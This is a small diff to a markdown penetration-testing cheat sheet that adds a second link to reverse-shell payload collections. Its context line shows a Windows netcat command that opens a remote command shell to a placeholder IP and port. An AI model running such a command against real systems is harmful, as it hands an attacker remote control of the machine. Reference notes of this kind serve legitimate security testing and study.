@@ -156,7 +156,9 @@ Windows: <code>nc.exe -nv [IP] [PORT] -e cmd.exe</code>
 
 ### Reverse Shells
 
-[Reverse Shells](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
+[PayloadsAllTheThings Reverse Shells](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
+
+[PentestMonkey Reverse Shells](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
 
 ### Upgrading Reverse Shells
 
